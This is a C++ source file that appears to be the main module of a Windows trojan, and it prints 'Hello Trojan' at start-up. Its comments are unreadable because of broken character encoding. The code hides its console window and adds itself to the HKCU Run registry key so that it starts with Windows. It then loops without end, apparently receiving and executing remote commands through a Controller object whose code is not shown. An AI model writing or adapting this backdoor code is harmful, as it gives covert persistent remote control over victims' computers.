#include "Config.h"
#include "Global.h"
#include "Controller.h"

using namespace std;

char recvBuffer[BUFFER_SIZE];
vector<string> fileScanResult;
vector<string> directoryScanResult;

void HKRunator()   // ���������� 
{
	HKEY hKey;  //����ע���ľ��

	   //�ҵ�ϵͳ��������λ�� 
	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	//��������Key  
	long lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_WRITE, &hKey);

	if (lRet == ERROR_SUCCESS)  //�򿪳ɹ�
	{
		char pFileName[MAX_PATH] = { 0 };  //������·��
		//�õ����������ȫ·��  
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
		//���һ����Key,������ֵ // �����"test"��Ӧ�ó������֣����Ӻ�׺.exe�� 
		lRet = RegSetValueEx(hKey, "SetAutoRun", 0, REG_SZ, (BYTE*)pFileName, dwRet);
		//�ر�ע���  
		RegCloseKey(hKey);
		if (lRet != ERROR_SUCCESS)
		{
			printf("ϵͳ��������,������ɿ�����������\n");
		}
		else
		{
			printf("�򿪿��������ɹ�\n");
		}
		// isrun = 1; 
	}
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
	return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}

int main()
{
	if (HIDE_CONSOLE)
	{
		HideConsole();
	}
	cout << "Hello Trojan: " << GetCurrentProcessId() << endl;
	if (AUTOSTART)
	{
		HKRunator();
	}
	char test1[30];
	char test2[30] = { 0 };
	while (1)
	{
		Controller ctrl;
		bool NORMAL = true;

		if (ctrl.initializeError)
		{
			cout << "initialize error: " << GetLastError() << endl;
		}
		else
		{
			while (NORMAL && ctrl.working)
			{
				NORMAL = ctrl.RecvCmd();
				if (NORMAL)
					NORMAL = ctrl.ExecCmd();
			}
			if (NORMAL)
			{
				cout << "[+] Successfully Quit. [+]" << endl;
			}
			else
			{
				cout << "[-] Error: " << GetLastError() << endl;
			}
		}
		ctrl.Close();
	}

	//ShowConsole();
	system("pause");
}